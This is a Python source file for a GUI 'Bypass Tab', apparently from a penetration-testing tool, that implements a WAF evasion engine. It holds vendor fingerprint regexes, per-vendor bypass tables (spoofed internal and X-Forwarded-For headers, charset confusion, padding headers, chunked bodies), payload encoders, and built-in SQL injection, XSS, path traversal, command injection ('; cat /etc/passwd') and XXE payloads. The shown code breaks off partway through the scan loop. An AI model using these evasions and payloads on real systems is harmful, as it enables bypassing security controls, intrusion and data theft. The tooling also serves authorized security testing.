"""
bypass_tab.py  –  Bypass Tab
==============================
Two modes:
  • WAF Bypass            — evade WAF rules blocking payloads (12 phases)
  • Access Control Bypass — bypass 401/403/405 access controls (13 phases)

New layout (horizontal split):
  ┌──────────────────────────┬──────────────────────────────────────┐
  │  LEFT PANEL              │  RIGHT PANEL                         │
  │  ┌────────────────────┐  │  ┌──────────────────────────────┐   │
  │  │  HTTP Request      │  │  │  🔄 Traffic Monitor           │   │
  │  │  (like Repeater)   │  │  │  ├── probe table              │   │
  │  │                    │  │  │  ├── req / resp detail        │   │
  │  └────────────────────┘  │  └──────────────────────────────┘   │
  │  ┌────────────────────┐  │  ┌──────────────────────────────┐   │
  │  │  WAF Bypass Config │  │  │  🏆 Bypass Results            │   │
  │  │  • WAF type        │  │  └──────────────────────────────┘   │
  │  │  • Payload type    │  │  ┌──────────────────────────────┐   │
  │  │  • Blocked payload │  │  │  📋 Scan Log                  │   │
  │  │  • Extra payloads  │  │  └──────────────────────────────┘   │
  │  └────────────────────┘  │                                      │
  └──────────────────────────┴──────────────────────────────────────┘

Self-contained: WAF engine (WafScanMixin) and _parse_request_components
are inlined directly — no external waf_bypass.py or scanner_tab.py needed.
"""

from __future__ import annotations

import re
import json
import time
import urllib.parse
import urllib3
import requests
import logging
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QSplitter, QGroupBox,
    QLabel, QLineEdit, QTextEdit, QPushButton, QComboBox,
    QTableWidget, QTableWidgetItem, QHeaderView, QTabWidget,
    QCheckBox, QSpinBox, QDoubleSpinBox, QFrame, QApplication,
    QMenu, QMessageBox, QProgressBar,
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QColor, QBrush, QFont, QTextCursor

from constants import (
    COLOR_ELEVATED_BG, COLOR_TEXT, COLOR_TEXT_BRIGHT, COLOR_BORDER,
    COLOR_ACCENT, COLOR_SUCCESS, COLOR_HIGH, COLOR_CRITICAL,
    COLOR_TEXT_MUTED, COLOR_DARK_BG, COLOR_CARD_BG,
    FONT_SIZE_NORMAL, HttpSyntaxHighlighter,
)

import concurrent.futures
import base64
import html
from collections import defaultdict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Data containers
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class ProbeEntry:
    index: int
    method: str
    url: str
    technique: str
    status_code: int
    length: int
    elapsed: float
    bypassed: bool
    confidence: str
    evidence: str
    request_headers: Dict[str, str] = field(default_factory=dict)
    request_body: str = ""
    response_body: str = ""
    response_headers: Dict[str, str] = field(default_factory=dict)


# ─────────────────────────────────────────────────────────────────────────────
# Payload detection
# ─────────────────────────────────────────────────────────────────────────────

_PAYLOAD_PATTERNS: List[Tuple[str, str]] = [
    ("xss",  r"<script|onerror=|onload=|javascript:|<svg|alert\(|prompt\(|confirm\("),
    ("sqli", r"(?i)('|\-\-|UNION\s+SELECT|OR\s+1=1|AND\s+1=|SLEEP\(|WAITFOR|DROP\s+TABLE)"),
    ("lfi",  r"\.\./|etc/passwd|etc/shadow|/proc/"),
    ("cmdi", r";\s*id|;\s*cat\s|;\s*whoami|\|\s*id|\$\(|`[a-z]"),
    ("xxe",  r"<!DOCTYPE|<!ENTITY|SYSTEM\s+[\"']file|SYSTEM\s+[\"']http"),
    ("ssti", r"\{\{|\$\{|#\{|<%="),
    ("ssrf", r"http://localhost|http://127\.|169\.254\.|file://"),
]

def _detect_payload_category(payload: str) -> Optional[str]:
    for cat, pattern in _PAYLOAD_PATTERNS:
        if re.search(pattern, payload, re.IGNORECASE):
            return cat
    return None


# ─────────────────────────────────────────────────────────────────────────────
# Request parser
# ─────────────────────────────────────────────────────────────────────────────

def _parse_raw_request(raw: str) -> Dict[str, Any]:
    lines = raw.replace("\r\n", "\n").split("\n")
    result: Dict[str, Any] = {
        "method": "GET", "path": "/", "http_version": "HTTP/1.1",
        "headers": {}, "body": "", "host": "",
    }
    if not lines:
        return result
    parts = lines[0].strip().split()
    if len(parts) >= 2:
        result["method"] = parts[0].upper()
        result["path"]   = parts[1]
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            k, v = lines[i].split(":", 1)
            result["headers"][k.strip()] = v.strip()
            if k.strip().lower() == "host":
                result["host"] = v.strip()
        i += 1
    if i < len(lines):
        result["body"] = "\n".join(lines[i + 1:]).strip()
    return result


def _extract_blocked_payload(raw: str) -> Tuple[Optional[str], Optional[str]]:
    parsed     = _parse_raw_request(raw)
    candidates: List[str] = []
    path = parsed.get("path", "")
    if "?" in path:
        qs = path.split("?", 1)[1]
        for _, vals in urllib.parse.parse_qs(qs, keep_blank_values=True).items():
            candidates.extend(vals)
    body = parsed.get("body", "")
    if body:
        try:
            for _, vals in urllib.parse.parse_qs(body, keep_blank_values=True).items():
                candidates.extend(vals)
        except Exception:
            pass
        try:
            def _json_vals(o, acc):
                if isinstance(o, dict):
                    for v in o.values(): _json_vals(v, acc)
                elif isinstance(o, list):
                    for v in o: _json_vals(v, acc)
                elif isinstance(o, str):
                    acc.append(o)
            _json_vals(json.loads(body), candidates)
        except Exception:
            pass
        candidates.append(body)
    for c in candidates:
        cat = _detect_payload_category(c)
        if cat:
            return c, cat
    return None, None




# ─────────────────────────────────────────────────────────────────────────────
# _parse_request_components  (inlined from scanner_tab.py — no import needed)
# ─────────────────────────────────────────────────────────────────────────────

def _parse_request_components(request_data: Dict[str, Any]):
    """
    Parse a request dict into its constituent parts.
    Returns (full_url, method, headers, cookies, params, body_params, body_content).
    Shared by the dialog helpers below.
    """
    import json as _json

    full_url = request_data.get("url", "")
    request_text = request_data.get("request_text", "")
    lines = request_text.split('\n')

    method = "GET"
    if lines:
        fl = lines[0].strip().upper()
        for m in ("POST", "PUT", "PATCH", "DELETE"):
            if fl.startswith(m):
                method = m
                break

    headers: Dict[str, str] = {}
    cookies: Dict[str, str] = {}
    body_content = ""
    seen_cookie = None

    for idx, line in enumerate(lines[1:], 1):
        stripped = line.strip()
        if stripped == "" or stripped == "\r\n":
            body_content = "\n".join(lines[idx + 1:])
            break
        if ':' in line:
            k, v = line.split(':', 1)
            k, v = k.strip(), v.strip()
            kl = k.lower()
            if kl not in {kk.lower() for kk in headers}:
                headers[k] = v
            if kl == 'cookie' and seen_cookie is None:
                seen_cookie = k
                # Step 1: split on '; ' (RFC standard separator)
                raw_pairs = re.split(r';\s*', v)
                # Step 2: some clients/proxies use ', ' instead of '; '.
                # Re-split any piece that looks like "value, NextName=..."
                # (only split when ', ' is followed by a word-char then '=')
                expanded = []
                for piece in raw_pairs:
                    sub = re.split(r',\s+(?=\w[^=]*=)', piece)
                    expanded.extend(s.strip() for s in sub if s.strip())
                for pair in expanded:
                    if '=' in pair:
                        cn, cv = pair.split('=', 1)
                        cookies[cn.strip()] = cv.strip()

    parsed_url = urllib.parse.urlparse(full_url)
    params = urllib.parse.parse_qs(parsed_url.query)

    body_params: Dict[str, List] = {}
    if method in ("POST", "PUT", "PATCH") and body_content.strip():
        ct = ""
        for k, v in headers.items():
            if k.lower() == "content-type":
                ct = v.lower()
                break
        if "application/json" in ct:
            try:
                jdata = _json.loads(body_content.strip())
                if isinstance(jdata, dict):
                    body_params = {k: [str(v)] for k, v in jdata.items()}
            except Exception:
                pass
        elif "multipart/form-data" not in ct:
            try:
                body_params = urllib.parse.parse_qs(body_content.strip(), keep_blank_values=True)
            except Exception:
                pass
        else:
            # ── Multipart form-data: parse text fields AND file fields ────────
            try:
                # Get boundary from the ORIGINAL (non-lowercased) content-type header
                # because body content uses the original case boundary string.
                ct_orig = ""
                for k, v in headers.items():
                    if k.lower() == "content-type":
                        ct_orig = v
                        break
                bm = re.search(r'boundary=([^\s;\"\']+)', ct_orig, re.IGNORECASE)
                if bm:
                    boundary = bm.group(1).strip()
                    # body_content was built by split('\n')+join('\n') so \r\n
                    # line endings are gone. Split on --boundary (case-sensitive,
                    # as boundaries are case-sensitive per RFC 2046).
                    parts = re.split(r'--' + re.escape(boundary) + r'(?:--)?', body_content)
                    for part in parts:
                        part = part.lstrip('\r\n')
                        if not part or part.strip() == '--':
                            continue
                        # Part headers and body are separated by a blank line.
                        # After split('\n') normalisation we have \n\n.
                        # Also handle original \r\n\r\n just in case.
                        if '\r\n\r\n' in part:
                            part_headers, part_body = part.split('\r\n\r\n', 1)
                        elif '\n\n' in part:
                            part_headers, part_body = part.split('\n\n', 1)
                        else:
                            continue
                        part_body = part_body.rstrip('\r\n')

                        cd_match = re.search(
                            r'Content-Disposition:[^\n]*?;\s*name="([^"]+)"',
                            part_headers, re.IGNORECASE
                        )
                        if not cd_match:
                            continue
                        field_name = cd_match.group(1)

                        fn_match = re.search(
                            r'filename="([^"]*)"', part_headers, re.IGNORECASE
                        )
                        if fn_match:
                            filename = fn_match.group(1) or "file"
                            body_params[field_name] = [f"FILE:{filename}"]
                        else:
                            body_params[field_name] = [part_body]
            except Exception:
                pass

    return full_url, method, headers, cookies, params, body_params, body_content


# ─────────────────────────────────────────────────────────────────────────────
# WAF Bypass Engine  (inlined from waf_bypass.py — no external file needed)
# ─────────────────────────────────────────────────────────────────────────────

# ===========================================================================
# WAF FINGERPRINT SIGNATURES
# 3-tuple: (where_to_check, regex_pattern, vendor_name)
# ===========================================================================
_WAF_SIGS: List[Tuple[str, str, str]] = [
    # Cloudflare
    ("header", r"cloudflare",                           "Cloudflare"),
    ("header", r"\bcf-ray\b",                           "Cloudflare"),
    ("header", r"__cfduid|cf_clearance|cf-cache-status","Cloudflare"),
    ("body",   r"Attention Required[^<]*Cloudflare",    "Cloudflare"),
    ("body",   r"cloudflare-nginx|Ray ID",              "Cloudflare"),
    # Akamai
    ("header", r"x-akamai|akamai-grn|x-check-cacheable","Akamai"),
    ("body",   r"Access Denied.*Akamai|Reference #",    "Akamai"),
    # Imperva / Incapsula
    ("header", r"x-cdn.*imperva|incapsula|x-iinfo",     "Imperva/Incapsula"),
    ("body",   r"Incapsula incident|incap_ses|visid_incap","Imperva/Incapsula"),
    # ModSecurity
    ("header", r"x-mod-security|mod_security",          "ModSecurity"),
    ("body",   r"ModSecurity Action|generated by Mod_Security|NOYB","ModSecurity"),
    # Barracuda
    ("header", r"x-barracuda",                          "Barracuda"),
    ("body",   r"Barracuda Networks|barra_counter_session","Barracuda"),
    # AWS WAF
    ("header", r"x-amzn-requestid|x-amz-cf-id",        "AWS WAF"),
    ("body",   r"AWS WAF|AWSWAFToken|aws-waf-token",    "AWS WAF"),
    # F5 BIG-IP
    ("header", r"\bx-f5-",                              "F5 BIG-IP"),
    ("body",   r"Request Rejected.*F5|BIG-IP",          "F5 BIG-IP"),
    # Sucuri
    ("header", r"x-sucuri-id|x-sucuri-cache",           "Sucuri"),
    ("body",   r"Sucuri WebSite Firewall|Access Denied - Sucuri","Sucuri"),
    # Distil / Radware
    ("header", r"x-distil|x-dp-reason",                 "Distil/Radware"),
    ("body",   r"distil_r_blocked|Distil Networks",      "Distil/Radware"),
    # Fortinet FortiWeb
    ("header", r"x-fn-clientid|fortigate",               "Fortinet FortiWeb"),
    ("body",   r"FortiWeb|Fortinet|FORTIGATE",           "Fortinet FortiWeb"),
    # Citrix / NetScaler
    ("header", r"x-nsprotect|ns_af",                     "Citrix WAF"),
    ("body",   r"NetScaler|Citrix ADC",                  "Citrix WAF"),
    # Nginx + NAXSI
    ("body",   r"NAXSI_FMT|nginx.* 403",                 "Nginx+NAXSI"),
    # Generic
    ("header", r"x-denied-reason|x-waf-event-info",      "Generic WAF"),
    ("body",   r"Web Application Firewall|WAF[^a-z]",     "Generic WAF"),
]

# ===========================================================================
# VENDOR-SPECIFIC BYPASS TABLES
# Each vendor gets a list of bypass strategies:
#   {"type": "header",    "name": ..., "value": ...}
#   {"type": "ct",        "value": ...}   content-type swap
#   {"type": "technique", "name": ...}    named technique
# ===========================================================================
_VENDOR_STRATS: Dict[str, List[Dict]] = {
    "Cloudflare": [
        # Charset confusion — CF passes ibm037/utf-7 through without inspecting
        {"type":"ct",  "value":"application/x-www-form-urlencoded; charset=ibm037"},
        {"type":"ct",  "value":"application/x-www-form-urlencoded; charset=utf-7"},
        {"type":"ct",  "value":"application/json; charset=utf-16le"},
        # Fake internal CF headers
        {"type":"header","name":"CF-Connecting-IP",     "value":"127.0.0.1"},
        {"type":"header","name":"CF-Worker",            "value":"1"},
        {"type":"header","name":"CF-IPCountry",         "value":"US"},
        {"type":"header","name":"CF-Access-Client-Id",  "value":"bypass"},
        # Accept confusion
        {"type":"header","name":"Accept",               "value":"*/*;q=0.1"},
        # CF sometimes trusts XFF before inspecting
        {"type":"header","name":"X-Forwarded-For",      "value":"127.0.0.1"},
        {"type":"header","name":"True-Client-IP",       "value":"127.0.0.1"},
        {"type":"technique","name":"cf_unicode_payload"},
        {"type":"technique","name":"cf_chunked_body"},
    ],
    "ModSecurity": [
        # OWASP CRS evasion — comment injection
        {"type":"technique","name":"sql_block_comment"},
        {"type":"technique","name":"mysql_version_comment"},
        {"type":"technique","name":"modsec_whitespace"},
        # HPP confuses CRS anomaly scoring
        {"type":"technique","name":"hpp_duplicate"},
        # Null byte truncates string comparison in older CRS
        {"type":"technique","name":"null_byte_param"},
        # Chunked body bypasses REQUEST_BODY inspection
        {"type":"technique","name":"chunked_body"},
        # Oversized header pushes past inspection window
        {"type":"header","name":"X-Padding","value":"A"*8000},
        # %0a in param evades some CRS regex rules
        {"type":"technique","name":"newline_in_param"},
        # Content-Type multipart confusion
        {"type":"ct",  "value":"multipart/form-data; boundary=----bypass"},
        # Double encoding
        {"type":"technique","name":"double_encode_param"},
    ],
    "Akamai": [
        # Akamai debug headers — sometimes disables inspection
        {"type":"header","name":"Pragma",              "value":"akamai-x-cache-on, akamai-x-cache-remote-on"},
        {"type":"header","name":"X-Akamai-Debug",      "value":"true"},
        {"type":"header","name":"Akamai-Origin-Hop",   "value":"2"},
        # Multi-hop XFF chain to confuse IP reputation check
        {"type":"header","name":"X-Forwarded-For",     "value":"127.0.0.1, 10.0.0.1, 192.168.1.1"},
        {"type":"header","name":"True-Client-IP",      "value":"127.0.0.1"},
        {"type":"header","name":"X-Akamai-Edgescape",  "value":"georegion=246,country_code=US,city=SOMEWHERE"},
        # Akamai sometimes skips inspection on certain Accept-Encoding
        {"type":"header","name":"Accept-Encoding",     "value":"identity"},
        {"type":"technique","name":"akamai_json_nesting"},
    ],
    "AWS WAF": [
        # JSON body nesting evades AWS rule groups
        {"type":"technique","name":"json_deep_nesting"},
        {"type":"technique","name":"json_unicode_escape"},
        {"type":"technique","name":"json_array_wrap"},
        # Body size fragmentation — AWS WAF has a body size limit (8KB by default)
        {"type":"technique","name":"body_fragment"},
        # Header flood to consume rule evaluation budget
        {"type":"technique","name":"header_flood"},
        # XFF trust bypass
        {"type":"header","name":"X-Forwarded-For",     "value":"127.0.0.1"},
        # Base64 param value — some AWS rules don't decode
        {"type":"technique","name":"base64_param"},
        # Fake AWS internal header
        {"type":"header","name":"X-Amzn-Trace-Id",     "value":"Root=1-bypass-00000000000000000000000"},
    ],
    "F5 BIG-IP": [
        {"type":"header","name":"X-F5-BIGIP-Status",   "value":"bypass"},
        {"type":"header","name":"X-F5-Auth-Token",     "value":""},
        # F5 ASM: null byte in header value
        {"type":"technique","name":"null_byte_header"},
        {"type":"technique","name":"chunked_body"},
        {"type":"ct",  "value":"multipart/form-data; boundary=--bypass--"},
        # F5 sometimes trusts XFF
        {"type":"header","name":"X-Forwarded-For",     "value":"127.0.0.1"},
    ],
    "Imperva/Incapsula": [
        {"type":"header","name":"X-Forwarded-For",     "value":"127.0.0.1"},
        {"type":"header","name":"X-Originating-IP",    "value":"127.0.0.1"},
        {"type":"header","name":"Accept-Language",     "value":"en-US,en;q=0.9,*;q=0.1"},
        {"type":"header","name":"X-Incapsula-Request", "value":"bypass"},
        # Imperva known: oversized cookie header
        {"type":"header","name":"Cookie",              "value":"incap_bypass="+"A"*2000},
        {"type":"technique","name":"imperva_json_array"},
        {"type":"technique","name":"double_encode_param"},
    ],
    "Sucuri": [
        {"type":"header","name":"X-Sucuri-Clientip",   "value":"127.0.0.1"},
        {"type":"header","name":"X-Forwarded-For",     "value":"127.0.0.1"},
        {"type":"technique","name":"sucuri_comment_mutation"},
    ],
    "Barracuda": [
        {"type":"header","name":"X-Barracuda-Connect", "value":"127.0.0.1"},
        {"type":"header","name":"X-Forwarded-For",     "value":"127.0.0.1"},
        {"type":"header","name":"User-Agent",          "value":"BarracudaCentral"},
        {"type":"technique","name":"chunked_body"},
    ],
    "Distil/Radware": [
        {"type":"header","name":"X-Forwarded-For",     "value":"127.0.0.1"},
        {"type":"header","name":"User-Agent",          "value":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
        {"type":"technique","name":"hpp_duplicate"},
    ],
    "Fortinet FortiWeb": [
        {"type":"header","name":"X-Forwarded-For",     "value":"127.0.0.1"},
        {"type":"technique","name":"chunked_body"},
        {"type":"ct",  "value":"application/x-www-form-urlencoded; charset=utf-7"},
        {"type":"technique","name":"fortinet_comment"},
    ],
    "Citrix WAF": [
        {"type":"header","name":"X-Forwarded-For",     "value":"127.0.0.1"},
        {"type":"header","name":"Accept-Encoding",     "value":"identity, *;q=0"},
        {"type":"header","name":"X-Bypass-Padding",    "value":"A"*6000},
        {"type":"technique","name":"chunked_body"},
    ],
    "Nginx+NAXSI": [
        {"type":"technique","name":"overlong_utf8"},
        {"type":"technique","name":"unicode_fullwidth"},
        {"type":"technique","name":"sql_block_comment"},
        {"type":"header","name":"X-Forwarded-For",     "value":"127.0.0.1"},
    ],
    "Generic WAF": [
        {"type":"technique","name":"chunked_body"},
        {"type":"technique","name":"hpp_duplicate"},
        {"type":"technique","name":"double_encode_param"},
        {"type":"technique","name":"null_byte_param"},
        {"type":"technique","name":"sql_block_comment"},
        {"type":"technique","name":"json_deep_nesting"},
    ],
}

# ===========================================================================
# ATTACK PAYLOADS — used for WAF trigger + bypass testing
# These are test payloads, not actual exploitation
# ===========================================================================
_WAF_TEST_PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "1' OR 1=1--",
        "1 UNION SELECT NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "1; DROP TABLE users--",
        "admin'--",
        "1 AND SLEEP(5)--",
        "1 WAITFOR DELAY '0:0:5'--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<body onload=alert(1)>",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        "....//....//etc/passwd",
    ],
    "cmdi": [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "& whoami",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "{{config}}",
        "<%= 7*7 %>",
    ],
}

# ===========================================================================
# ENCODING HELPERS
# ===========================================================================

def _double_url_encode(s: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")

def _triple_url_encode(s: str) -> str:
    return urllib.parse.quote(_double_url_encode(s), safe="")

def _html_entity_encode(s: str) -> str:
    return "".join(f"&#{ord(c)};" for c in s)

def _html_hex_entity_encode(s: str) -> str:
    return "".join(f"&#x{ord(c):x};" for c in s)

def _unicode_fullwidth(s: str) -> str:
    return "".join(chr(0xFF01 + ord(c) - 0x21) if 0x21 <= ord(c) <= 0x7E else c for c in s)

def _hex_encode(s: str) -> str:
    return "".join(f"%{ord(c):02x}" for c in s)

def _merge_headers(base: Dict[str, str], overrides: Dict[str, str]) -> Dict[str, str]:
    """
    Merge override headers into base, replacing any existing header that
    matches case-insensitively.  Preserves original casing of kept headers.
    e.g. base has "referer: /foo", override has "Referer: /bar"
    → result has "Referer: /bar"  (original "referer" key removed)
    """
    result = {}
    override_lower = {k.lower(): v for k, v in overrides.items()}
    for k, v in base.items():
        if k.lower() not in override_lower:
            result[k] = v
    result.update(overrides)
    return result


def _utf8_overlong(s: str) -> str:
    m = {"/": "%c0%af", ".": "%c0%ae", " ": "%c0%a0", "<": "%c0%bc", ">": "%c0%be",
         "'": "%c0%a7", "\"": "%c0%a2"}
    return "".join(m.get(c, c) for c in s)

def _unicode_escape_json(s: str) -> str:
    """Encode each char as \\uXXXX for JSON string context."""
    return "".join(f"\\u{ord(c):04x}" for c in s)

def _null_byte_insert(s: str, every: int = 3) -> str:
    """Insert %00 every N characters."""
    parts = [s[i:i+every] for i in range(0, len(s), every)]
    return "%00".join(parts)

def _sql_comment_mutate(payload: str) -> List[str]:
    """Return several comment-injected variants of an SQL payload."""
    variants = []
    words = payload.split()
    if len(words) >= 2:
        # Insert block comment between first two words
        variants.append("/**/".join(words[:2]) + " " + " ".join(words[2:]))
        variants.append("/*bypass*/".join([words[0], " ".join(words[1:])]))
        # MySQL version comment
        variants.append(f"/*!50000{payload}*/")
        variants.append(f"/*!{payload}*/")
        # URL-encoded newline between words
        variants.append("%0a".join(words))
        variants.append("%09".join(words))
        # Mixed case
        variants.append("".join(c.upper() if i % 2 else c.lower()
                                for i, c in enumerate(payload)))
    return variants or [payload]

def _fingerprint_waf(resp_headers: dict, resp_body: str) -> Optional[str]:
    hdr_str = " ".join(f"{k.lower()}: {v.lower()}" for k, v in resp_headers.items())
    body_lc = (resp_body or "")[:5000].lower()
    for loc, pattern, vendor in _WAF_SIGS:
        target = hdr_str if loc == "header" else body_lc
        if re.search(pattern, target, re.IGNORECASE):
            return vendor
    return None


# ===========================================================================
# WafScanMixin
# ===========================================================================

class WafScanMixin:
    """
    Advanced WAF detection and evasion.
    12 deep phases, vendor-aware, payload-focused.
    Designed to answer: 'Is a WAF blocking my payloads, and can I evade it?'
    """

    def scan_waf(self, waf_config: Dict[str, Any] = None) -> Dict[str, Any]:
        rd      = self.request_data
        url     = rd.get("url", "")
        method  = (rd.get("method") or "GET").upper()
        hdrs    = self._waf_build_headers(rd)
        body    = rd.get("body") or rd.get("request_body") or ""
        timeout = getattr(self, "scan_timeout", 20)
        delay   = getattr(self, "scan_req_delay", 0.0)
        workers = getattr(self, "scan_max_workers", 6) if getattr(self, "boost_mode", False) else 1

        parsed     = urllib.parse.urlparse(url)
        origin     = f"{parsed.scheme}://{parsed.netloc}"
        path       = parsed.path or "/"
        clean_path = path.lstrip("/")
        query      = ("?" + parsed.query) if parsed.query else ""
        base_no_qs = origin + path
        parsed_qs  = urllib.parse.parse_qs(parsed.query)

        findings: List[Dict] = []
        waf_info  = {"detected": False, "vendor": None, "confidence": "none",
                     "evidence": [], "block_status": None}
        stats     = {"phases_run": 0, "payloads_sent": 0,
                     "bypasses_found": 0, "waf_vendor": None}

        # ── Consume waf_config from dialog ──────────────────────────────────
        cfg               = waf_config or getattr(self, "waf_config", {}) or {}
        forced_vendor     = cfg.get("vendor")
        active_phases     = set(cfg.get("active_phases", list(range(13))))
        payload_cats      = cfg.get("payload_cats",     ["sqli","xss","lfi","cmdi","xxe","ssti"])
        injection_params  = cfg.get("injection_params", [])
        custom_payloads   = cfg.get("custom_payloads",  [])
        extra_headers     = cfg.get("extra_headers",    {})
        timing_ratio_min  = cfg.get("timing_ratio",     2.0)
        timing_abs_min    = cfg.get("timing_abs",       0.5)
        url_override      = cfg.get("url_override",     None)
        # Payload-first mode: use the actual payload from the request
        primary_payload   = cfg.get("primary_payload",  None)   # the exact payload in the request
        primary_category  = cfg.get("primary_category", None)   # its detected category
        known_payloads    = cfg.get("known_payloads",   [])     # user-selected known WAF-bypass payloads

        # Build the master payload list for this scan:
        #   1. Primary payload (the one that's being blocked) — first and highest priority
        #   2. Known WAF-bypass payloads of the same category
        #   3. Custom user-supplied payloads
        #   4. Fallback: built-in test payloads if none of the above
        _primary_payloads: List[str] = []
        if primary_payload:
            _primary_payloads.append(primary_payload)
        _primary_payloads.extend(known_payloads)
        _primary_payloads.extend(custom_payloads)

        # Determine effective category for built-in fallback selection
        _eff_cat = primary_category or (payload_cats[0] if payload_cats else "sqli")

        # Apply config overrides
        if url_override:
            url     = url_override
            parsed  = urllib.parse.urlparse(url)
            origin  = f"{parsed.scheme}://{parsed.netloc}"
            path    = parsed.path or "/"
            clean_path = path.lstrip("/")
            query   = ("?" + parsed.query) if parsed.query else ""
            base_no_qs = origin + path
            parsed_qs  = urllib.parse.parse_qs(parsed.query)

        # Apply extra headers from dialog to base headers
        if extra_headers:
            hdrs = {**hdrs, **extra_headers}

        # Build active_test_payloads:
        # If we have a primary payload (from request), that's the focus.
        # We also include known WAF-bypass payloads of the same category.
        # Fallback to built-in payloads when nothing is provided.
        if _primary_payloads:
            # Payload-first mode: primary + known + custom, all under one key
            active_test_payloads = {_eff_cat: _primary_payloads}
            # Also add built-in payloads for the same category as supplemental
            if _eff_cat in _WAF_TEST_PAYLOADS:
                combined = list(_primary_payloads)
                for p in _WAF_TEST_PAYLOADS[_eff_cat]:
                    if p not in combined:
                        combined.append(p)
                active_test_payloads[_eff_cat] = combined
        else:
            # No request payload: use built-in payloads filtered by selected categories
            active_test_payloads = {k: v for k, v in _WAF_TEST_PAYLOADS.items()
                                    if k in payload_cats}
            if not active_test_payloads:
                active_test_payloads = _WAF_TEST_PAYLOADS
        # Inject extra custom payloads as a dedicated category
        if custom_payloads:
            active_test_payloads = dict(active_test_payloads)
            active_test_payloads["custom"] = custom_payloads

        # Filter injection params
        if injection_params:
            # User selected specific params — rebuild parsed_qs to only those
            filtered_qs: Dict[str, List[str]] = {}
            for ip in injection_params:
                if ip.startswith("url:"):
                    param_name = ip[4:]
                    if param_name in parsed_qs:
                        filtered_qs[param_name] = parsed_qs[param_name]
                    else:
                        filtered_qs[param_name] = ["1"]  # synthetic placeholder
            if filtered_qs:
                parsed_qs = filtered_qs

        # Build master payload list from config
        # Priority: primary_payload (from request) → known bypass payloads → custom
        _cfg_payloads = cfg.get('payloads', [])
        _primary_payload = cfg.get('primary_payload', '')
        _vuln_type = cfg.get('vuln_type', '') or 'sqli'
        _target_param = cfg.get('target_param', '')

        # If config supplied payloads, use them; otherwise fall back to built-ins
        if _cfg_payloads:
            # Use config payloads, organised by type for phase-specific logic
            active_test_payloads = {_vuln_type: _cfg_payloads}
            # Also expose primary payload for phases that use a single representative
            _primary = _primary_payload or (_cfg_payloads[0] if _cfg_payloads else '')
        else:
            # No config payloads — use built-in test payloads filtered by category
            active_test_payloads = {k: v for k, v in _WAF_TEST_PAYLOADS.items()
                                    if k in payload_cats}
            if not active_test_payloads:
                active_test_payloads = _WAF_TEST_PAYLOADS
            if custom_payloads:
                active_test_payloads = dict(active_test_payloads)
                active_test_payloads['custom'] = custom_payloads
            _primary = list(active_test_payloads.values())[0][0] if active_test_payloads else ''

        # Override injection params with target_param if set
        if _target_param and ':' in _target_param:
            _loc, _pname = _target_param.split(':', 1)
            if _loc == 'url' and _pname not in parsed_qs:
                parsed_qs = {_pname: [self._all_params_from_rd(_pname)]}
            elif _loc == 'url':
                parsed_qs = {_pname: parsed_qs.get(_pname, ['1'])}

        def _phase_active(n: int) -> bool:
            return n in active_phases

        # Log scan mode
        if primary_payload:
            self.scan_progress.emit(
                f"🔥  [WAF] Payload-first mode — primary: [{_eff_cat.upper()}] "
                f"{primary_payload[:60]}  |  "
                f"Known bypass payloads: {len(known_payloads)}  |  "
                f"Custom: {len(custom_payloads)}")
        self.scan_progress.emit(
            f"🔥  [WAF] Starting advanced WAF detection + bypass — {url[:80]}")

        # ── Phase 0 — Baseline + Fingerprint ─────────────────────────────
        self.scan_progress.emit("🔥  [WAF] Phase 0 — Baseline + WAF Fingerprinting")
        stats["phases_run"] += 1

        # Step 0a: clean baseline
        b_status, b_len, b_time, b_resp = self._waf_send_full(
            url, hdrs, method, body, timeout,
            payload="[WAF-Baseline]", payload_type="WAF-Baseline")
        stats["payloads_sent"] += 1
        self.scan_progress.emit(
            f"🔥  [WAF] Clean baseline → HTTP {b_status}  {b_len}b  {b_time:.3f}s")

        # Step 0b: passive fingerprint from clean response
        if b_resp is not None:
            vendor = _fingerprint_waf(dict(b_resp.headers), b_resp.text)
            if vendor:
                waf_info["detected"] = True
                waf_info["vendor"]   = vendor
                waf_info["confidence"] = "passive"
                waf_info["evidence"].append(f"Passive: found {vendor} signatures in baseline response")
                stats["waf_vendor"] = vendor
                self.scan_progress.emit(f"🔥  [WAF] Passive detect: {vendor}")

        # Apply forced vendor from config (overrides auto-detection)
        if forced_vendor:
            waf_info['detected']    = True
            waf_info['vendor']      = forced_vendor
            waf_info['confidence']  = 'manual'
            waf_info['evidence'].append(f'Manual override: user selected {forced_vendor}')
            stats['waf_vendor']     = forced_vendor
            self.scan_progress.emit(f'🔥  [WAF] Vendor manually set: {forced_vendor}')

        # Step 0c: active fingerprint — fire attack payloads to trigger WAF
        block_status = None
        if not forced_vendor:
            # Use primary payload for fingerprinting if available (more targeted)
            _fp_probes = []
            if _primary_payloads:
                _fp_probes = [(_eff_cat, _primary_payloads[:3])]
            else:
                _fp_probes = [("sqli", _WAF_TEST_PAYLOADS["sqli"][:3]),
                              ("xss",  _WAF_TEST_PAYLOADS["xss"][:2]),
                              ("lfi",  _WAF_TEST_PAYLOADS["lfi"][:2])]
            for ptype, plist in _fp_probes:
                for pval in plist:
                    if not self.running:
                        break
